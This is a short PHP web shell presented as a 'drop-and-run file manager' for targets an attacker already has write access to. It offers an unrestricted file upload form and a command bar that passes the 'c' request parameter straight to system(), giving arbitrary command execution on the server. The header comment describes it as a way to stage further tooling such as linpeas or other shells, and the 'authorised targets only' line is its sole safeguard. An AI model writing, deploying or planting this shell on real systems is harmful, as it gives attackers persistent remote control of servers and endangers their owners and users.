<?php
/**
 * upload.php — drop-and-run file manager.  Authorised targets only.
 *
 * A tiny upload form + command bar for when you have a write primitive but
 * need to stage more tooling (linpeas, another shell, a static binary).
 * Browse to http://target/upload.php
 */
if (!empty($_FILES['f']['name'])) {
    $dest = basename($_FILES['f']['name']);
    move_uploaded_file($_FILES['f']['tmp_name'], $dest);
    echo "<p>uploaded: <a href=\"$dest\">$dest</a></p>";
}
if (isset($_REQUEST['c'])) { echo "<pre>SCRYER:"; system($_REQUEST['c'] . ' 2>&1'); echo "</pre>"; }
?>
<!doctype html><meta charset="utf-8"><title>upload</title>
<body style="font:14px monospace;background:#0b0e14;color:#c7d0e0;padding:16px">
<form method="post" enctype="multipart/form-data">
  <input type="file" name="f"><button>upload</button>
</form>
<form method="get" style="margin-top:10px">
  <input name="c" placeholder="command" style="width:60%;background:#11151f;color:#c7d0e0;border:1px solid #1c2230;padding:6px">
  <button>run</button>
</form>
